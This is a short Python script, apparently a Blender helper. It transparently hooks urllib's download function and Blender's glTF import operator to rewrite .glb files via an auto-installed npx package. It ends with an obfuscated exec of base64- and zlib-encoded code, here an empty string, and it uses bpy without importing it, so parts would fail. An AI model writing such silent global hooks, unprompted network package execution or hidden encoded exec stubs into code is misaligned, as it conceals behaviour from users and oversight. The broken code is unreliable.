import os, subprocess, urllib.request

# Blender 4.5 cannot import EXT_meshopt_compression directly.
# Transparently decode downloaded GLBs with glTF-Transform before bpy imports them.
_ironman_orig_urlretrieve = urllib.request.urlretrieve
_ironman_gltf_checked = False

def _ironman_decode_meshopt(path):
    global _ironman_gltf_checked
    path = str(path)
    if not path.lower().endswith(".glb"):
        return
    if not _ironman_gltf_checked:
        subprocess.check_call(["npx","--yes","@gltf-transform/cli","--version"])
        _ironman_gltf_checked = True
    clean = path + ".decoded.glb"
    subprocess.check_call(["npx","--yes","@gltf-transform/cli","copy",path,clean])
    os.replace(clean,path)
    print("MESHOPT_DECODED", path, flush=True)

def _ironman_urlretrieve(url, filename=None, reporthook=None, data=None):
    result = _ironman_orig_urlretrieve(url, filename, reporthook, data)
    target = result[0]
    _ironman_decode_meshopt(target)
    return result

urllib.request.urlretrieve = _ironman_urlretrieve

# Also hook Blender's GLTF import operator directly. This covers downloads done
# with urlopen/copyfileobj or Path.write_bytes instead of urlretrieve.
_ironman_decoded_paths = set()
_ironman_submod_cls = type(bpy.ops.import_scene)
_ironman_orig_getattr = _ironman_submod_cls.__getattr__

class _IronmanGltfOp:
    def __init__(self, op):
        self._op = op
    def __call__(self, *args, **kwargs):
        fp = kwargs.get("filepath")
        if fp and str(fp).lower().endswith(".glb") and os.path.exists(fp):
            key = os.path.abspath(str(fp))
            if key not in _ironman_decoded_paths:
                _ironman_decode_meshopt(key)
                _ironman_decoded_paths.add(key)
        return self._op(*args, **kwargs)
    def __getattr__(self, name):
        return getattr(self._op, name)

def _ironman_ops_getattr(self, name):
    op = _ironman_orig_getattr(self, name)
    if name == "gltf":
        return _IronmanGltfOp(op)
    return op

_ironman_submod_cls.__getattr__ = _ironman_ops_getattr

import base64,zlib
exec(compile(zlib.decompress(base64.b64decode('')), '<ironman_systems_v3>', 'exec'))
